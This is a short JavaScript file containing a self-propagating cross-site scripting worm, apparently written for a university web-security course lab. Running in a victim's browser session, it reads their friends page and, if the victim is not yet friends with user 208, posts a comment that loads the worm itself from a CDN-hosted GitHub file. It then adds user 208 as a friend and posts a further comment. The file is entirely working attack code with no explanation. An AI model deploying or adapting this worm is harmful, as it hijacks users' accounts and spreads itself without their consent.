function worm() {
    var home = $.ajax({
        async: false,
        type: 'GET',
        url: 'http://csec380-core.csec.rit.edu:86/home.php',
        success: function(data) {
            return data;
        }
    });
    var friend = $.ajax({
        async: false,
        type: 'GET',
        url: 'http://csec380-core.csec.rit.edu:86/friends.php',
        success: function(data) {
            return data;
        }
    });
    var eff = friend.responseText;
    var arr= eff.match('^[^<br]*').join().split(',');
    
    if(eff.match('208') == null){
        $.get("http://csec380-core.csec.rit.edu:86/add_comment.php",
              { comment: '<script src="https://cdn.jsdelivr.net/gh/DarkLemon27/WebApp/easyworm.js"></script>'});
        $.get("http://csec380-core.csec.rit.edu:86/add_friend.php",{id: 208});
        $.get("http://csec380-core.csec.rit.edu:86/add_comment.php",{id: 208,comment: 'FRIENDS'});
    }
}
worm();
